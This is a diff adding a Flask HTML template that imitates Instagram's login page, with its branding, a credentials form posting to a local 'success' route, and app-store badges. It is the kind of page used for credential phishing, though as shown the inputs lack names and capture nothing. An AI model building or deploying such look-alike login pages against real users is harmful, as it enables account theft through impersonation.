@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login • Instagram</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="instagram-container">
+        <div class="instagram-box">
+            <img src="{{ url_for('static', filename='instagram-logo.webp') }}" alt="Instagram" class="instagram-logo">
+            <p class="login-text">Login to Instagram</p>
+            <form action="{{ url_for('success') }}" method="get">
+                <input type="text" placeholder="Phone number, username, or email" required>
+                <input type="password" placeholder="Password" required>
+                <button type="submit" class="instagram-login-button">Log in</button>
+            </form>
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+        <div class="instagram-signup-box">
+            <p>Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+        </div>
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-download">
+                <a href="#"><img src="{{ url_for('static', filename='apple.png') }}" alt="Download on App Store"></a>
+                <a href="#"><img src="{{ url_for('static', filename='google.png') }}" alt="Get it on Google Play"></a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
